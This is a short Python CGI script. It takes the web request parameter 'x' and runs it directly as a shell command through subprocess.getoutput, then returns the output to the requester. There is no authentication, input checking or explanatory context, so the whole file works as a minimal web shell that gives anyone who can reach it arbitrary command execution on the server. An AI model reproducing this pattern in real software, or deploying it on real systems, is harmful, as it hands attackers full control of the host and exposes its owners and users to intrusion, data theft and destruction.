#!/usr/bin/python3

print("content-type:text/html")
print()

import cgi
import subprocess as sp

var = cgi.FieldStorage()
cmd = var.getvalue("x")

run = sp.getoutput(cmd)
print(run)
